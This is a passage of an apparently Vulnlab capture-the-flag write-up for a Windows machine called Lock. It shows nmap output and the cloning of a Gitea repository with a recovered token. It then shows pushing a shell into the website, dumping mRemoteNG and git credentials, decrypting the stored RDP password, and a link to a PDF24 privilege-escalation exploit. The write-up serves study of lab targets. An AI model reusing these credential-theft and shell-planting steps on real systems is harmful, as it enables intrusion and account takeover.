+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;theme-auto&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;manifest&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   HTTPOptions:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     HTTP/1.0 405 Method Not Allowed
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Allow: HEAD
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Allow: HEAD
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Allow: GET
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: i_like_gitea=eccfe9ba6abb01a8; Path=/; HttpOnly; SameSite=Lax
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: _csrf=DF561VFH57BEAMRh7bfLXES0tyk6MTcyMTgyNjA2NDM4MTk1NTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     X-Frame-Options: SAMEORIGIN
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Date: Wed, 24 Jul 2024 13:01:04 GMT
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Content-Length: 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span></span><span class="line"><span class="cl"><span class="s2">| rdp-ntlm-info:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Target_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS_Domain_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS_Computer_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   DNS_Domain_Name: Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   DNS_Computer_Name: Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Product_Version: 10.0.20348
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System_Time: 2024-07-24T13:02:20+00:00
+</span></span></span><span class="line"><span class="cl"><span class="s2">| ssl-cert: Subject: commonName=Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Not valid before: 2024-07-23T12:57:30
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_Not valid after:  2025-01-22T12:57:30
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_ssl-date: 2024-07-24T13:03:00+00:00; -1s from scanner time.
+</span></span></span><span class="line"><span class="cl"><span class="s2">5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_http-title: Service Unavailable
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>We recovered the token from previous commit and then download some repos:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.91.85:3000/ellen.freeman/website.git</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Git configuration :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git config --global user.email <span class="s2">&#34;you@example.com&#34;</span>
+</span></span><span class="line"><span class="cl">git config --global user.name <span class="s2">&#34;Your Name&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>We put our shell in the website and push :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git add .
+</span></span><span class="line"><span class="cl">git commit -m <span class="s2">&#34;Your commit message&#34;</span>
+</span></span><span class="line"><span class="cl">git push</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>We found a config.xml:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">c:<span class="se">\U</span>sers<span class="se">\e</span>llen.freeman<span class="se">\D</span>ocuments&gt;type config.xml
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> config.xml
+</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
+</span></span><span class="line"><span class="cl">&lt;mrng:Connections xmlns:mrng<span class="o">=</span><span class="s2">&#34;http://mremoteng.org&#34;</span> <span class="nv">Name</span><span class="o">=</span><span class="s2">&#34;Connections&#34;</span> <span class="nv">Export</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">EncryptionEngine</span><span class="o">=</span><span class="s2">&#34;AES&#34;</span> <span class="nv">BlockCipherMode</span><span class="o">=</span><span class="s2">&#34;GCM&#34;</span> <span class="nv">KdfIterations</span><span class="o">=</span><span class="s2">&#34;1000&#34;</span> <span class="nv">FullFileEncryption</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">Protected</span><span class="o">=</span><span class="s2">&#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&#34;</span> <span class="nv">ConfVersion</span><span class="o">=</span><span class="s2">&#34;2.6&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;Node <span class="nv">Name</span><span class="o">=</span><span class="s2">&#34;RDP/Gale&#34;</span> <span class="nv">Type</span><span class="o">=</span><span class="s2">&#34;Connection&#34;</span> <span class="nv">Descr</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">Icon</span><span class="o">=</span><span class="s2">&#34;mRemoteNG&#34;</span> <span class="nv">Panel</span><span class="o">=</span><span class="s2">&#34;General&#34;</span> <span class="nv">Id</span><span class="o">=</span><span class="s2">&#34;a179606a-a854-48a6-9baa-491d8eb3bddc&#34;</span> <span class="nv">Username</span><span class="o">=</span><span class="s2">&#34;Gale.Dekarios&#34;</span> <span class="nv">Domain</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">Password</span><span class="o">=</span><span class="s2">&#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==&#34;</span> <span class="nv">Hostname</span><span class="o">=</span><span class="s2">&#34;Lock&#34;</span> <span class="nv">Protocol</span><span class="o">=</span><span class="s2">&#34;RDP&#34;</span> <span class="nv">PuttySession</span><span class="o">=</span><span class="s2">&#34;Default Settings&#34;</span> <span class="nv">Port</span><span class="o">=</span><span class="s2">&#34;3389&#34;</span> <span class="nv">ConnectToConsole</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">UseCredSsp</span><span class="o">=</span><span class="s2">&#34;true&#34;</span> <span class="nv">RenderingEngine</span><span class="o">=</span><span class="s2">&#34;IE&#34;</span> <span class="nv">ICAEncryptionStrength</span><span class="o">=</span><span class="s2">&#34;EncrBasic&#34;</span> <span class="nv">RDPAuthenticationLevel</span><span class="o">=</span><span class="s2">&#34;NoAuth&#34;</span> <span class="nv">RDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">RDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">LoadBalanceInfo</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">Colors</span><span class="o">=</span><span class="s2">&#34;Colors16Bit&#34;</span> <span class="nv">Resolution</span><span class="o">=</span><span class="s2">&#34;FitToWindow&#34;</span> <span class="nv">AutomaticResize</span><span class="o">=</span><span class="s2">&#34;true&#34;</span> <span class="nv">DisplayWallpaper</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">DisplayThemes</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">EnableFontSmoothing</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">EnableDesktopComposition</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">CacheBitmaps</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RedirectDiskDrives</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RedirectPorts</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RedirectPrinters</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RedirectSmartCards</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RedirectSound</span><span class="o">=</span><span class="s2">&#34;DoNotPlay&#34;</span> <span class="nv">SoundQuality</span><span class="o">=</span><span class="s2">&#34;Dynamic&#34;</span> <span class="nv">RedirectKeys</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">Connected</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">PreExtApp</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">PostExtApp</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">MacAddress</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">UserField</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">ExtApp</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">VNCCompression</span><span class="o">=</span><span class="s2">&#34;CompNone&#34;</span> <span class="nv">VNCEncoding</span><span class="o">=</span><span class="s2">&#34;EncHextile&#34;</span> <span class="nv">VNCAuthMode</span><span class="o">=</span><span class="s2">&#34;AuthVNC&#34;</span> <span class="nv">VNCProxyType</span><span class="o">=</span><span class="s2">&#34;ProxyNone&#34;</span> <span class="nv">VNCProxyIP</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">VNCProxyPort</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">VNCProxyUsername</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">VNCProxyPassword</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">VNCColors</span><span class="o">=</span><span class="s2">&#34;ColNormal&#34;</span> <span class="nv">VNCSmartSizeMode</span><span class="o">=</span><span class="s2">&#34;SmartSAspect&#34;</span> <span class="nv">VNCViewOnly</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">RDGatewayUsageMethod</span><span class="o">=</span><span class="s2">&#34;Never&#34;</span> <span class="nv">RDGatewayHostname</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">RDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">&#34;Yes&#34;</span> <span class="nv">RDGatewayUsername</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">RDGatewayPassword</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">RDGatewayDomain</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">InheritCacheBitmaps</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritColors</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritDescription</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritDisplayThemes</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritDisplayWallpaper</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritEnableFontSmoothing</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritEnableDesktopComposition</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritDomain</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritIcon</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPanel</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPassword</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPort</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritProtocol</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPuttySession</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectDiskDrives</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectKeys</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectPorts</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectPrinters</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectSmartCards</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRedirectSound</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritSoundQuality</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritResolution</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritAutomaticResize</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritUseConsoleSession</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritUseCredSsp</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRenderingEngine</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritUsername</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritICAEncryptionStrength</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDPAuthenticationLevel</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDPMinutesToIdleTimeout</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDPAlertIdleTimeout</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritLoadBalanceInfo</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPreExtApp</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritPostExtApp</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritMacAddress</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritUserField</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritExtApp</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCCompression</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCEncoding</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCAuthMode</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCProxyType</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCProxyIP</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCProxyPort</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCProxyUsername</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCProxyPassword</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCColors</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCSmartSizeMode</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritVNCViewOnly</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayUsageMethod</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayHostname</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayUseConnectionCredentials</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayUsername</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayPassword</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> <span class="nv">InheritRDGatewayDomain</span><span class="o">=</span><span class="s2">&#34;false&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">&lt;/mrng:Connections&gt;</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>More Creds :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">type</span> .git-credentials
+</span></span><span class="line"><span class="cl">http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Decrypt :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>Jul 26, <span class="m">2024</span> - 17:22:39 <span class="o">(</span>CEST<span class="o">)]</span> exegol-Algo /workspace <span class="c1"># python3 exploit.py config.xml</span>
+</span></span><span class="line"><span class="cl">Name: RDP/Gale
+</span></span><span class="line"><span class="cl">Hostname: Lock
+</span></span><span class="line"><span class="cl">Username: Gale.Dekarios
+</span></span><span class="line"><span class="cl">Password: ty8wnW9qCKDosXo6</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Tool : https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py</p>
+<ul>
+<li>Connect with remmina (RDP)</li>
+</ul>
+<p>User VL{d617459a7ff1a2b2ae7274d677095d59}</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cmd /c dir /A</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Local privesc with pdf24 : https://packetstormsecurity.com/files/176206/PDF24-Creator-11.15.1-Local-Privilege-Escalation.html</li>
+<li>Tool:
+https://github.com/googleprojectzero/symboliclink-testing-tools</li>
+</ul>
+<p>Root VL{67895a961bc218ebc50d86b49f0ea192}</p>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/ad/local-privilege-escalation/linux-privesc/" class="stretched-link text-reset text-decoration-none">Linux Privesc</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/code/lua/" class="stretched-link text-reset text-decoration-none">Lua</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
